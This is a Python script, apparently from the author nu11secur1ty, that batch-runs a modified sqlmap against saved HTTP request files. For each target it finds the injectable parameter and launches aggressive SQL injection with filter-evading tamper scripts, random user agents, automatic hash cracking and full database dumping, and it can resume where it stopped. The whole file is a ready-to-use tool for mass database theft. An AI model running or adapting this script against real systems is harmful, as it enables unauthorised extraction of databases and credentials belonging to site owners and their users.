#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==================================================
Bushido.py - SQLmap Exploit Runner
Author       : nu11secur1ty
Mode         : 2025
Description  : Automatically runs all exploits in exploit_env
               with sqlmap-nu11secur1ty, preserves colorized output,
               shows target vulnerable parameter, supports resuming,
               and exits cleanly on Ctrl+C.
==================================================
"""

import os
import subprocess
from datetime import datetime
import sys

def clean_exit(message=None, code=0):
    ts = datetime.now().strftime("%H:%M:%S /%Y-%m-%d/")
    if message:
        print(f"[*] {message} @ {ts}")
    print(f"[*] ending @ {ts}")
    sys.exit(code)

# === Base paths ===
base_dir = os.path.dirname(os.path.abspath(__file__))
sqlmap_path = os.path.join(base_dir, "sqlmap.py")
exploit_dir = os.path.join(base_dir, "exploit_env")
resume_file = os.path.join(exploit_dir, "completed_exploits.txt")

# === Checks ===
if not os.path.isfile(sqlmap_path):
    clean_exit(f"[!] sqlmap.py not found at {sqlmap_path}", 1)
if not os.path.isdir(exploit_dir):
    clean_exit(f"[!] exploit_env folder not found at {exploit_dir}", 1)

exploit_files = [f for f in os.listdir(exploit_dir) if f.endswith(".txt")]
if not exploit_files:
    clean_exit(f"[!] No .txt exploit files found in {exploit_dir}", 1)

# === Load completed exploits ===
completed_exploits = set()
if os.path.isfile(resume_file):
    with open(resume_file, "r") as f:
        completed_exploits = set(line.strip() for line in f if line.strip())

try:
    for idx, exploit_file in enumerate(exploit_files, start=1):
        if exploit_file in completed_exploits:
            print(f"[i] Skipping already completed exploit: {exploit_file}")
            continue

        exploit_path = os.path.join(exploit_dir, exploit_file)
        print(f"\033[1;36m[{idx}/{len(exploit_files)}] Running sqlmap-nu11secur1ty with exploit: {exploit_file}\033[0m")

        # === Extract vulnerable parameter ===
        vulnerable_param = None
        with open(exploit_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.startswith("GET") and "?" in line:
                    query = line.split(" ", 2)[1].split("?", 1)[1]
                    vulnerable_param = query.split("&")[0].split("=")[0]
                    break
                elif "=" in line and not line.startswith(("POST", "HTTP")):
                    vulnerable_param = line.split("&")[0].split("=")[0]
                    break

        if vulnerable_param:
            print(f"       \033[1;33mTarget parameter: {vulnerable_param}\033[0m")

        cmd = [
            sys.executable, sqlmap_path,
            '-r', exploit_path,
            '--tamper=space2comment',
            '--dbms=mysql',
            '--time-sec=7',
            '--random-agent',
            '--level=5',
            '--risk=3',
            '--batch',
            '--answers=crack=Y,dict=Y,continue=Y,quit=N',
            '--dump'
        ]

        # Run sqlmap directly to preserve color
        process = subprocess.Popen(cmd)
        process.wait()

        if process.returncode != 0:
            print(f"[!] sqlmap exited with error on {exploit_file}")
        else:
            print(f"[+] Finished exploit: {exploit_file}\n")
            # Save completed exploit
            with open(resume_file, "a") as f:
                f.write(exploit_file + "\n")

except KeyboardInterrupt:
    clean_exit("[!] Interrupted by user", 1)

clean_exit("[+] All exploits finished successfully")
